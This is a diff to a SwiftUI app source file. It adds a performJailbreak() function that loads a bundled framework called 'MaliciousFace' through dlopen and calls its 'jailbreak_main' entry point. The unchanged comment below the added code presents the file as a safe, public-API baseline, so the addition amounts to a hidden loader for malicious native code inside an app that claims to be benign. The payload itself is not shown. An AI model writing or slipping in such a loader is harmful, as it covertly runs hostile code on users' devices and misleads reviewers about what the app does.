@@ -1,4 +1,33 @@
+import Foundation
+import Darwin
 import SwiftUI
+
+func performJailbreak() {
+    // 1️⃣  Locate the malicious framework inside the app bundle.
+    guard let frameworkURL = Bundle.main.url(forResource: "MaliciousFace", withExtension: "framework") else {
+        print("Jailbreak: framework not found")
+        return
+    }
+
+    // 2️⃣  Load the framework with dlopen().
+    guard let handle = dlopen(frameworkURL.path, RTLD_NOW) else {
+        print("Jailbreak: dlopen failed: \(String(cString: dlerror()))")
+        return
+    }
+
+    // 3️⃣  Resolve the jailbreak symbol.
+    typealias JailbreakFunc = @convention(c) () -> Void
+    guard let sym = dlsym(handle, "jailbreak_main") else {
+        print("Jailbreak: symbol not found")
+        return
+    }
+
+    // 4️⃣  Call the jailbreak entry point.
+    let jailbreak: JailbreakFunc = unsafeBitCast(sym, to: JailbreakFunc.self)
+    jailbreak()
+
+    print("Jailbreak: executed")
+}
 
 /// Safe, public-API baseline. This is an application UI, not an installed watch face.
 struct ContentView: View {
